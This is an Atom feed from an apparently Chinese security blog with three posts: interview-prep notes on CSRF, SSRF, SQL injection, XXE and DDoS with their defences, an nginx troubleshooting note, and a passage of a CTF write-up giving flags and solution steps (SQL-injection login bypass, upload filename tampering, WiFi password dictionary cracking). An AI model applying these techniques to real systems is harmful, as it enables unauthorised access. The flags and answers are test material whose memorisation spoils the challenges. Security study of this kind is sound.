<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Teams Six</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.teamssix.com/"/>
  <updated>2019-10-14T01:09:29.129Z</updated>
  <id>http://www.teamssix.com/</id>
  
  <author>
    <name>Teams Six</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>经过一场面试，我发现我还存在这些不足</title>
    <link href="http://www.teamssix.com/year/191014-090745.html"/>
    <id>http://www.teamssix.com/year/191014-090745.html</id>
    <published>2019-10-14T01:07:45.000Z</published>
    <updated>2019-10-14T01:09:29.129Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近参加了一场面试，平时感觉自己学的还挺不错的，但是在面试的时候才意识到到原来自己还有那么多东西不够了解。</p><p>这其中包括以前只是听过并没有深入学习了解的东西，同时也包括以前很了解但是现在因为长时间没有去使用碰触导致已经遗忘的东西，所以本篇文章我想记录一下这次面试过程中哪些自己不太了解的知识点。</p><a id="more"></a><p>PS：</p><p>1、面试中有的问题现在已经记得不是很深刻了，所以我想起来多少就记录多少咯。</p><p>2、因为引用的文章内容都比较多，所以本文只提到了一些概念性的东西，关于每个知识点具体的详情有想看的小伙伴就自己在参考资料里面去找吧，嘿嘿 [狗头保命]</p><h1 id="0x01-SSRF和CSRF的概念以及区别"><a href="#0x01-SSRF和CSRF的概念以及区别" class="headerlink" title="0x01 SSRF和CSRF的概念以及区别"></a>0x01 SSRF和CSRF的概念以及区别</h1><p>这个知识点就属于以前有了解，但是平时很少接触以至于遗忘的类型，同时在笔试的时候就有提到这个点，笔试结束后我还特意查了一下，但是面试的时候却没有答上来，有点尴尬，下面就引用CSDN和知乎里两篇文章的描述，此处引用的文章地址为本文参考资料1和2。</p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF又称跨站请求伪造，XSS就是CSRF中的一种。二者区别是XSS利用的是用户对指定网站的信任，CSRF利用是网站对用户浏览器的信任。</p><p>简单来说，CSRF是通过第三方网站伪装成正常用户登录目标网站，并以正常用户的身份对用户账号进行操作，以达到目的，CSRF攻击原理流程如下图。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/mianshi1.png" alt></p><p>防御：</p><p>1、增加验证码机制，增加带有大量噪点的验证码，杜绝代码能够识别的简单验证码，当然了也经常被绕过。</p><p>2、验证referer,采用同源政策，referer记录着数据包的来源地址，来判断请求的合法性，但是这个可以伪造。</p><p>3、使用Token，令牌是一种将表单value的加密算法生成不同的加密结果，在服务器端进行验证。</p><p>4、在访问登录过一个网站，点击退出账户。</p><p>总结：</p><p>一次CSRF攻击成功实施，至少需要4个条件：</p><p>1、被害用户已经进行过WEB身份认证，并留有Cookie</p><p>2、新提交的请求无需重新进行身份认证或确认机制</p><p>3、攻击者了解WEB请求的参数构造</p><p>4、通过社交工程学诱使用户触发攻击的指令</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>SSRF又名服务端请求伪造攻击，如果把CSRF理解成客户端伪造请求攻击，它是利用用户本地的Cookie骗过服务器端的验证达到目的，而SSRF则是利用服务器天然能够访问内部网络的特点，进行攻击。</p><p>由此可以得出，SSRF的受害对象主要是一些服务器所连接的一些内网设备，如内网的应用程序，通过file协议获得内部网络的资料等。SSRF攻击常见于一些允许以URL作为参数，且未对URL进行过滤的服务器。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/mianshi2.png" alt></p><p>如上图，若URL是正常的第三方服务器，则URL会过滤通过。若URL是带有命令操作的服务器端A，且绕过了服务器端A的过滤，则服务器端A会执行URL带有的命令，并将结果返回会客户端，由此一次SSRF攻击成功。</p><p>防御：</p><p>从以上我们可以得出，该漏洞产生的原因是由于服务端对资源进行请求的时候对URL的验证出现了纰漏，所以我们的防护策略主要是围绕URL的过滤。</p><p>1、将URL进行解析转化成IP，并使用正则表达式表示内网网址，并以此进行URL过滤。</p><p>2、建立URL白名单，只允许白名单上内容通过过滤。</p><p>3、建立内网IP黑名单，阻止对该IP的请求。</p><p>4、对返回内容进行过滤，减少敏感内容暴露。</p><p>5、禁止不需要的协议，只允许http和https协议的请求，减少file等协议的问题。</p><p>总结：</p><p>一次成功的SSRF需要2个条件：</p><p>1、攻击者知道服务器端的内网地址</p><p>2、服务器端未对请求URL进行过滤或过滤不完全</p><h1 id="0x02-SQL注入的类型以及防御"><a href="#0x02-SQL注入的类型以及防御" class="headerlink" title="0x02 SQL注入的类型以及防御"></a>0x02 SQL注入的类型以及防御</h1><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><p>这里采用看雪的一篇文章，此处引用的文章地址为本文参考资料3。</p><p>1、常见的sql注入按照参数类型可分为两种：数字型和字符型。</p><p>当发生注入点的参数为整数时，比如 ID，num，page等，这种形式的就属于数字型注入漏洞。同样，当注入点是字符串时，则称为字符型注入，字符型注入需要引号来闭合。</p><p>2、也可以根据数据库返回的结果，分为三种：回显注入、报错注入、盲注。</p><p>回显注入：可以直接在存在注入点的当前页面中获取返回结果。</p><p>报错注入：程序将数据库的返回错误信息直接显示在页面中，虽然没有返回数据库的查询结果，但是可以构造一些报错语句从错误信息中获取想要的结果。</p><p>盲注：程序后端屏蔽了数据库的错误信息，没有直接显示结果也没有报错信息，只能通过数据库的逻辑和延时函数来判断注入的结果。根据表现形式的不同，盲注又分为based boolean和based time两种类型。</p><p>3、按照注入位置及方式不同分为以下几种：post注入，get注入，cookie注入，盲注，延时注入，搜索注入，base64注入，无论此种分类如何多，都可以归纳为以上两种形式。</p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>这里采用知乎上的一个问答，此处引用的文章地址为本文参考资料4。</p><p>问：</p><p>如何从根本上防止 SQL 注入？</p><p>SQL注入导致的安全问题数不胜数，为什么这么多年来同样的问题一再发生？</p><p>如果是因为SQL脚本拼接的原因，为什么不在新的实现中采用api调用的方式来杜绝漏洞？</p><p>答：</p><p>SQL注入并不是一个在SQL内不可解决的问题，这种攻击方式的存在也不能完全归咎于SQL这种语言，因为注入的问题而放弃SQL这种方式也是因噎废食。首先先说一个我在其他回答中也曾提到过的观点：<strong>没有（运行时）编译，就没有注入。</strong></p><p>SQL注入产生的原因，和栈溢出、XSS等很多其他的攻击方法类似，就是未经检查或者未经充分检查的用户输入数据，意外变成了代码被执行。针对于SQL注入，则是用户提交的数据，被数据库系统编译而产生了开发者预期之外的动作。也就是，SQL注入是用户输入的数据，在拼接SQL语句的过程中，超越了数据本身，成为了SQL语句查询逻辑的一部分，然后这样被拼接出来的SQL语句被数据库执行，产生了开发者预期之外的动作。</p><p>所以从根本上防止上述类型攻击的手段，还是避免数据变成代码被执行，时刻分清代码和数据的界限。而具体到SQL注入来说，被执行的恶意代码是通过数据库的SQL解释引擎编译得到的，所以只要<strong>避免用户输入的数据被数据库系统编译</strong>就可以了。</p><p>至于如何避免用户输入的数据被数据库系统编译，我觉着可以参考CSDN上的一篇文章，详见本文参考资料5，该文具体说了以下内容：</p><p>1、escape处理</p><p>2、使用预编译语句</p><p>3、使用存储过程</p><p>4、检查数据类型</p><p>5、使用安全函数</p><h1 id="0x03-XXE攻击的概念"><a href="#0x03-XXE攻击的概念" class="headerlink" title="0x03 XXE攻击的概念"></a>0x03 XXE攻击的概念</h1><p>这个我不确定当时面试有没有问，不过刚才突然想到了，而且自己对XXE攻击也不是很了解，所以就简单记一下吧，此处引用的文章地址为本文参考资料6。</p><p>在介绍xxe漏洞前，先学习温顾一下XML的基础知识。</p><p>XML被设计为传输和存储数据，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><p>由于xxe漏洞与DTD文档相关，因此重点介绍DTD的概念。</p><p>文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。</p><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。实体根据引用方式，还可分为内部实体与外部实体，xxe漏洞主要是利用了DTD引用外部实体导致的漏洞。</p><p>XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。如果是linux下，可以读取/etc/passwd等目录下敏感数据。</p><p>XXE的漏洞检测：</p><p>1、检测XML是否会被成功解析</p><p>2、检测服务器是否支持DTD引用外部实体，如果支持引用外部实体，那么很有可能是存在xxe漏洞的。</p><p>XXE的修复与防御：</p><p>1、使用开发语言提供的禁用外部实体的方法</p><p>2、过滤用户提交的XML数据</p><h1 id="0x04-DDOS的类型"><a href="#0x04-DDOS的类型" class="headerlink" title="0x04 DDOS的类型"></a>0x04 DDOS的类型</h1><p>说到DDOS，我的第一反应就是TCP SYN泛洪攻击，对于其他的类型却了解很少，所以这里也同样记录一下，此处引用的文章地址为本文参考资料7。</p><p>首先有两类最常见的 DDoS 攻击，一是资源耗尽型；二是导致异常型，接下来就概要的说一下。</p><p>1、SYN Flood攻击即洪水攻击是通过TCP建立3次握手连接的漏洞产生，主要通过发送源IP虚假的SYN报文，使目标主机无法与其完成3次握手，因而占满系统的协议栈队列，致使资源得不到释放，进而达成拒绝服务的目的，SYN Flood攻击是移动互联网中DDoS攻击最主要的形式之一。</p><p>2、ACK Flood是对虚假的ACK包，目标设备会直接回复RST包丢弃连接，所以伤害值远不如SYN Flood。属于原始方式的DDoS攻击。 </p><p>3、UDP Flood是使用原始套接字伪造大量虚假源IP的UDP包，主要以DNS协议为主。 </p><p>4、ICMP Flood 即Ping攻击，是一种比较古老的方式。</p><p>5、CC攻击即ChallengeCollapsar挑战黑洞，主要通过大量的肉鸡或者寻找匿名代理服务器，模拟真实的用户向目标发起大量的访问请求，导致消耗掉大量的并发资源，使网站打开速度慢或拒绝服务。现阶段CC攻击是应用层攻击方式之一。 </p><p>6、DNS Flood主要是伪造海量的DNS请求，用于掩盖目标的DNS服务器。 </p><p>7、慢速连接攻击是针对HTTP协议，以slowloris攻击为起源，然后建立HTTP连接，设置一个较大的传输长度，实际每次发送很少字节，让服务器认为HTTP头部没有传输完成，因此数据传输越多就会造成连接资源耗尽。 </p><p>8、DOS攻击利用一些服务器程序的bug、安全漏洞、和架构性缺陷，然后通过构造畸形请求发送给服务器，服务器因不能判断处理恶意请求而瘫痪，造成拒绝服务。 </p><h1 id="0x05-跨域请求的概念"><a href="#0x05-跨域请求的概念" class="headerlink" title="0x05 跨域请求的概念"></a>0x05 跨域请求的概念</h1><p>以前记得在哪里有看到过这个，但是现在已经忘的差不多了，因此再复习复习，此处引用的文章地址为本文参考资料8。</p><p>同源是指相同的协议、域名、端口，三者都相同才属于同源。同源策略浏览器出于安全考虑，在全局层面禁止了页面加载或执行与自身来源不同的域的任何脚本，站外其他来源的脚本同页面的交互则被严格限制。</p><p>跨域由于浏览器同源策略，凡是发送请求url的协议、域名、端口三者之间任意一与当前页面地址不同即为跨域。</p><p>看看哪些情况下属于跨域访问：</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/mianshi3.png" alt></p><h1 id="0x06-Linux的日志文件位置"><a href="#0x06-Linux的日志文件位置" class="headerlink" title="0x06 Linux的日志文件位置"></a>0x06 Linux的日志文件位置</h1><p>讲道理，在面试前几天我在搭建一个三层靶机的环境，当时还查过Linux的日志文件位置的文章，但是在面试的时候却忘掉了，这就有点难受了，所以再记录一下吧，此处引用的文章地址为本文参考资料9。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">/var/log/messages   ：常规日志消息</span><br><span class="line">/var/log/boot       ：系统启动日志</span><br><span class="line">/var/log/debug      ：调试日志消息</span><br><span class="line">/var/log/auth.log   ：用户登录和身份验证日志</span><br><span class="line">/var/log/daemon.log ：运行squid，ntpd等其他日志消息到这个文件</span><br><span class="line">/var/log/dmesg      ：Linux内核环缓存日志</span><br><span class="line">/var/log/dpkg.log   ：所有二进制包日志都包括程序包安装和其他信息</span><br><span class="line">/var/log/faillog    ：用户登录日志文件失败</span><br><span class="line">/var/log/kern.log   ：内核日志文件</span><br><span class="line">/var/log/lpr.log    ：打印机日志文件</span><br><span class="line">/var/log/mail.*     ：所有邮件服务器消息日志文件</span><br><span class="line">/var/log/mysql.*    ：MySQL服务器日志文件</span><br><span class="line">/var/log/user.log   ：所有用户级日志</span><br><span class="line">/var/log/xorg.0.log ：X.org日志文件</span><br><span class="line">/var/log/apache2/*  ：Apache Web服务器日志文件目录</span><br><span class="line">/var/log/lighttpd/* ：Lighttpd Web服务器日志文件目录</span><br><span class="line">/var/log/fsck/*     ：fsck命令日志</span><br><span class="line">/var/log/apport.log ：应用程序崩溃报告/日志文件</span><br><span class="line">/var/log/syslog     ：系统日志</span><br><span class="line">/var/log/ufw        ：ufw防火墙日志</span><br><span class="line">/var/log/gufw       ：gufw防火墙日志</span><br></pre></td></tr></table></figure><h1 id="0x07-Linux的各目录含义"><a href="#0x07-Linux的各目录含义" class="headerlink" title="0x07 Linux的各目录含义"></a>0x07 Linux的各目录含义</h1><p>这个是以前大一大二的时候学的了，现在只记住了平时经常用的那几个目录，所以当时感觉回答的并不是很好，因此这里也简单记录一下，此处引用的文章地址为本文参考资料10。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/bin   重要的二进制 (binary) 应用程序</span><br><span class="line">/boot  启动 (boot) 配置文件</span><br><span class="line">/dev   设备 (device) 文件</span><br><span class="line">/etc   配置文件、启动脚本等 (etc)</span><br><span class="line">/home  本地用户主 (home) 目录</span><br><span class="line">/lib   系统库 (libraries) 文件</span><br><span class="line">/media 挂载可移动介质 (media)</span><br><span class="line">/mnt   挂载 (mounted) 文件系统</span><br><span class="line">/opt   提供一个供可选的 (optional) 应用程序安装目录</span><br><span class="line">/proc  特殊的动态目录</span><br><span class="line">/root  root (root) 用户主文件夹，读作“slash-root”</span><br><span class="line">/sbin  重要的系统二进制 (system binaries) 文件</span><br><span class="line">/srv   服务（serve）文件</span><br><span class="line">/sys   系统 (system) 文件</span><br><span class="line">/tmp   临时(temporary)文件</span><br><span class="line">/usr   包含绝大部分所有用户(users)都能访问的应用程序和文件</span><br><span class="line">/var   经常变化的(variable)文件，诸如日志或数据库等</span><br></pre></td></tr></table></figure><h1 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h1><p>暂时印象较深的也就想到这些了，说实话，虽然看着这篇文章记下了很多东西，但是我感觉自己脑子里还是没有记住多少东西，这些东西还是要经常去用才能记得住呀，平时不去用不去碰真的太容易忘了。通过这次面试也认识到自己的很多不足，所以不管最后面试结果怎么样，自己有收获就好，毕竟就像新东方唐叔说的：能力的提升不在于你做了多少道题，而在于你做了多少总结。</p><p>我觉着这句话再衍生一下就是能力的提升在于总结两个字，也就是说我自己犯了这些错误，有没有去总结，如果总结又总结了多少？而我觉着这些总结正是单属于我自己的宝贵财富，好了，不瞎扯了，感觉马上都变成鸡汤了 [ 笑哭 ]</p><p>参考资料：</p><blockquote><p>1、<a href="https://zhuanlan.zhihu.com/p/28657325" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28657325</a><br>2、<a href="https://blog.csdn.net/pygain/article/details/52912521" target="_blank" rel="noopener">https://blog.csdn.net/pygain/article/details/52912521</a><br>3、<a href="https://www.kanxue.com/book-6-110.htm" target="_blank" rel="noopener">https://www.kanxue.com/book-6-110.htm</a><br>4、<a href="https://www.zhihu.com/question/22953267" target="_blank" rel="noopener">https://www.zhihu.com/question/22953267</a><br>5、<a href="https://blog.csdn.net/hitwangpeng/article/details/45534787" target="_blank" rel="noopener">https://blog.csdn.net/hitwangpeng/article/details/45534787</a><br>6、<a href="https://thief.one/2017/06/20/1/" target="_blank" rel="noopener">https://thief.one/2017/06/20/1/</a><br>7、<a href="http://blog.itpub.net/69925937/viewspace-2647388/" target="_blank" rel="noopener">http://blog.itpub.net/69925937/viewspace-2647388/</a><br>8、<a href="https://blog.csdn.net/haozhoupan/article/details/51151656" target="_blank" rel="noopener">https://blog.csdn.net/haozhoupan/article/details/51151656</a><br>9、<a href="https://blog.csdn.net/qq_33571718/article/details/78373653" target="_blank" rel="noopener">https://blog.csdn.net/qq_33571718/article/details/78373653</a><br>10、<a href="https://www.jianshu.com/p/43f6785e0589" target="_blank" rel="noopener">https://www.jianshu.com/p/43f6785e0589</a><br>感谢以上文章的作者，如有侵权，烦请于我的公众号TeamsSix进行私信联系。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;最近参加了一场面试，平时感觉自己学的还挺不错的，但是在面试的时候才意识到到原来自己还有那么多东西不够了解。&lt;/p&gt;
&lt;p&gt;这其中包括以前只是听过并没有深入学习了解的东西，同时也包括以前很了解但是现在因为长时间没有去使用碰触导致已经遗忘的东西，所以本篇文章我想记录一下这次面试过程中哪些自己不太了解的知识点。&lt;/p&gt;
    
    </summary>
    
      <category term="经验总结" scheme="http://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="总结" scheme="http://www.teamssix.com/tags/%E6%80%BB%E7%BB%93/"/>
    
      <category term="面试" scheme="http://www.teamssix.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>【经验总结】VPS欠费后Hexo博客521无法访问</title>
    <link href="http://www.teamssix.com/year/191009-164624.html"/>
    <id>http://www.teamssix.com/year/191009-164624.html</id>
    <published>2019-10-09T08:46:24.000Z</published>
    <updated>2019-10-16T09:31:14.470Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近自己博客的VPS欠费了，但是充值之后，启动VPS发现博客依旧无法访问，经过多次排查后，最后的结果真的是哭笑不得，下面就记录一下我最后的解决办法。</p><a id="more"></a><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/521_1.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/521_2.png" alt></p><h1 id="0x01-排查过程"><a href="#0x01-排查过程" class="headerlink" title="0x01 排查过程"></a>0x01 排查过程</h1><p>排查的过程中，碰到的第一个问题就是我发现SSH连接不上了，第一反应是博客被黑了？之后修改密码后才登上，估计只是我忘记密码了吧<br>之后又发现hexo同步本地数据同步不上去，怎么搞都不行，之后过了一天，发现又可以同步了，这……玄学问题？<br>直到博客无法访问第三天，我到网上四处找寻结果，还是没找到我碰到的这个问题，最后突然看到有人提到hexo使用的是nginx网页服务器，这才恍然大悟，我博客的nginx没有开！</p><h1 id="0x02-解决步骤"><a href="#0x02-解决步骤" class="headerlink" title="0x02 解决步骤"></a>0x02 解决步骤</h1><p>直接进入自己VPS的命令行输入nginx开启nginx服务就行了，之后如果不放心可以输入netstat -ant看看自己的80端口有没有开。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VPS_name ~]# nginx</span><br><span class="line">[root@VPS_name ~]# netstat -ant</span><br></pre></td></tr></table></figure><h1 id="0x03-一点思考"><a href="#0x03-一点思考" class="headerlink" title="0x03 一点思考"></a>0x03 一点思考</h1><p>讲道理，最后发现是这样的一个原因，还是挺尴尬的，博客自从搭建好后，几个月都没有碰过这些环境的问题，以前VPS重启nginx也是自动开启的，这次不知道为什么突然不行了，同时也感觉到有些东西长时间不碰，即使当初看着多么简单的东西也变难了起来。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;最近自己博客的VPS欠费了，但是充值之后，启动VPS发现博客依旧无法访问，经过多次排查后，最后的结果真的是哭笑不得，下面就记录一下我最后的解决办法。&lt;/p&gt;
    
    </summary>
    
      <category term="经验总结" scheme="http://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="VPS" scheme="http://www.teamssix.com/tags/VPS/"/>
    
      <category term="Hexo" scheme="http://www.teamssix.com/tags/Hexo/"/>
    
      <category term="经验总结" scheme="http://www.teamssix.com/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>【CTF】记录一次CTF比赛的Writeup</title>
    <link href="http://www.teamssix.com/year/190925-114420.html"/>
    <id>http://www.teamssix.com/year/190925-114420.html</id>
    <published>2019-09-25T03:44:20.000Z</published>
    <updated>2019-09-25T05:06:16.981Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近因为省赛快来了，因此为实验室的小伙伴准备了这次比赛，总共10道题目，考虑到大多数小伙伴都刚从大一升到大二，因此整体难度不高，当然有几道难度还是有的。</p><p>题目大多数都是从网上东找西找的，毕竟我也是个菜鸟呀，还要给他们出题，我太难了。</p><p>废话不多说，直接上Writeup吧，以下题目的文件下载地址可以在我的公众号（TeamsSix）回复CTF获取。</p><a id="more"></a><h1 id="0x01-隐写-1"><a href="#0x01-隐写-1" class="headerlink" title="0x01 隐写 1"></a>0x01 隐写 1</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag：steganoI</span><br><span class="line"></span><br><span class="line">flag格式：passwd:</span><br><span class="line"></span><br><span class="line">题目来源：http://www.wechall.net/challenge/training/stegano1/index.php</span><br></pre></td></tr></table></figure><p>签到题，下载题目图片，利用记事本打开即可看到flag<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf1.png" alt></p><h1 id="0x02-隐写-2"><a href="#0x02-隐写-2" class="headerlink" title="0x02 隐写 2"></a>0x02 隐写 2</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag：teamssix</span><br><span class="line"></span><br><span class="line">Hint:一般在公共场合才能看的见</span><br><span class="line"></span><br><span class="line">题型参考：http://www.wechall.net/challenge/connect_the_dots/index.php</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf2.png" alt><br>打开图片，参考题目提示说一般在公共场合才能看见，因此通过盲文对照表可以得出flag是teamssix，图片中的AXHU只是用来干扰的，这道题也是我参考wechall里面的一道题型。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf3.png" alt></p><h1 id="0x03-Web-1"><a href="#0x03-Web-1" class="headerlink" title="0x03 Web 1"></a>0x03 Web 1</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flag:iamflagsafsfskdf11223</span><br><span class="line"></span><br><span class="line">Hint:站内有提示</span><br><span class="line"></span><br><span class="line">题目地址：</span><br><span class="line">http://lab1.xseclab.com/sqli2_3265b4852c13383560327d1c31550b60/index.php</span><br><span class="line">参考来源：http://hackinglab.cn/ShowQues.php?type=sqlinject</span><br></pre></td></tr></table></figure><p>1、打开题目地址<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf4.png" alt><br>2、查看源码找到提示<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf5.png" alt><br>3、根据提示使用admin登陆，并使用弱密码<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf6.png" alt><br>4、尝试多次都提示失败，利用万能密码再做尝试，找到flag<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf7.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf8.png" alt></p><h1 id="0x04-Web-2"><a href="#0x04-Web-2" class="headerlink" title="0x04 Web 2"></a>0x04 Web 2</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flag:76tyuh12OKKytig#$%^&amp;</span><br><span class="line"></span><br><span class="line">题目地址：http://lab1.xseclab.com/upload3_67275a14c1f2dbe0addedfd75e2da8c1/</span><br><span class="line"></span><br><span class="line">flag格式：key is :</span><br><span class="line"></span><br><span class="line">题目来源：http://hackinglab.cn/ShowQues.php?type=upload</span><br></pre></td></tr></table></figure><p>1、打开题目地址，发现是一个文件上传界面<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf9.png" alt><br>2、先把Burp挂上，随便上传一个JPG图片试试，并来到Burp重发这个包<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf10.png" alt><br>3、在Burp中对文件名进行修改，比如在jpg后加上.png或者其他东西，成功看到flag<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf11.png" alt></p><h1 id="0x05-soeasy"><a href="#0x05-soeasy" class="headerlink" title="0x05 soeasy"></a>0x05 soeasy</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flag:HackingLabHdd1b7c2fb3ff3288bff</span><br><span class="line"></span><br><span class="line">Hint:在这个文件中找到key就可以通关</span><br><span class="line"></span><br><span class="line">flag格式:key:</span><br><span class="line"></span><br><span class="line">题目来源：http://hackinglab.cn/ShowQues.php?type=pentest</span><br></pre></td></tr></table></figure><p><strong>解法一：</strong><br>1、下载文件后，发现是vmdk文件，利用DeskGenius打开后，发现Key，此为正确答案<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf12.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf13.png" alt></p><p><strong>解法二：</strong><br>1、利用Vmware映射虚拟硬盘同样可以打开<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf14.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf15.png" alt></p><h1 id="0x06-Crack"><a href="#0x06-Crack" class="headerlink" title="0x06 Crack"></a>0x06 Crack</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flag:19940808</span><br><span class="line"></span><br><span class="line">Hint:flag就是密码</span><br><span class="line"></span><br><span class="line">题目：邻居悄悄把密码改了，你只知道邻居1994年出生的，能找到她的密码吗？</span><br><span class="line"></span><br><span class="line">题目来源：http://hackinglab.cn/ShowQues.php?type=decrypt</span><br></pre></td></tr></table></figure><p>1、下载题目文件，根据题意，需要对WiFi密码破解，而且密码很有可能是邻居的生日，因此我们利用工具生成字典。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf16.png" alt><br>2、接下来利用ewsa进行破解，可以看到破解后的密码<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf17.png" alt><br>这道题目当时实验室有人用kali做的，kali下的工具感觉破解速度更快。</p><h1 id="0x07-BiliBili"><a href="#0x07-BiliBili" class="headerlink" title="0x07 BiliBili"></a>0x07 BiliBili</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag:Congratulations_you_got_it</span><br><span class="line"></span><br><span class="line">题目：bilibili</span><br><span class="line"></span><br><span 